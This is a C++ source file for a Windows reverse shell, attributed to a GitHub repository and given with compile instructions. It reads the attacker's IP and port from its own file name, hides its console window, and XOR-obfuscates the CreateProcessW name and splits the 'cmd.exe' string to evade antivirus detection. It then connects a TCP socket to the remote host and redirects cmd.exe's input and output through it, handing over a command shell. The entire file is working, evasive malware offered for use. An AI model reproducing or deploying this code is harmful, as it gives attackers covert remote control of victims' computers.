//Originally from https://github.com/tihanyin/Simple-Reverse-Shell/blob/main/Reverse_shell_2021_12.cpp
//Compile using Console App C++ with Visual Studio. The filename needs to be in the format of 192x168x1x2_4444.exe
#include <winsock2.h>
#include <stdio.h>
#include <string>
#include <tchar.h>

#pragma comment(lib,"ws2_32")
#pragma warning(disable:4996) 
WSADATA wsaData; SOCKET s1;
struct sockaddr_in R;
STARTUPINFO A;
PROCESS_INFORMATION B;
using std::string;
string getFileName(const string& s) {

        char sep = '/';

#ifdef _WIN32
        sep = '\\';
#endif
        size_t i = s.rfind(sep, s.length());
        if (i != string::npos) {
                return(s.substr(i + 1, s.length() - i));
        }

        return("");
}

typedef BOOL(WINAPI* pCreateProcessW)(
        LPCWSTR               lpApplicationName,
        LPWSTR                lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCWSTR               lpCurrentDirectory,
        LPSTARTUPINFOW        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
);

void XOR(char* data, size_t data_length, char* key, size_t key_length) {
        int j = 0;

        for (int i = 0;i < data_length;i++) {
                if (j == key_length - 1) {
                        j = 0;
                }
                data[i] = data[i] ^ key[j];
                j++;
        }
}


int main(int argc, char* argv[])
{
        char key[] = "mysecretkey";
        char sCreateProcessW[] = { 0x2e, 0x0b, 0x16, 0x04, 0x17, 0x17, 0x35, 0x06, 0x04, 0x06, 0x1c, 0x1e, 0x0a, 0x24, 0x65, };
        HMODULE kernel32Module = GetModuleHandleA("kernel32.dll");
        XOR((char*)sCreateProcessW, sizeof(sCreateProcessW), key, sizeof(key));
        pCreateProcessW cpw = (pCreateProcessW)GetProcAddress(kernel32Module, sCreateProcessW);
        FreeConsole(); //Hide window
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        string path = getFileName(argv[0]);
        path.resize(path.size() - 4); //remove .exe from the file
        //replace x to "."
        for (int i = 0; i < path.size(); i++) {
                if (path[i] == 'x') {
                        path[i] = '.';
                }
        }
        //PORT and IP from the executable
        size_t i = path.rfind("_", path.length());
        string port = path.substr(i + 1, i - path.length());
        string ip = path.substr(0, i);
        s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        R.sin_family = AF_INET;
        R.sin_port = htons(std::stoul(port, nullptr, 0));
        R.sin_addr.s_addr = inet_addr(ip.c_str());
        WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
        memset(&A, 0, sizeof(A));
        A.cb = sizeof(A);
        A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;
        TCHAR c[256] = L"cm";
        TCHAR d[256] = L"d.exe";
        cpw(NULL, _tcscat(c, d), 0, 0, 1, 0, 0, 0, &A, &B);

}
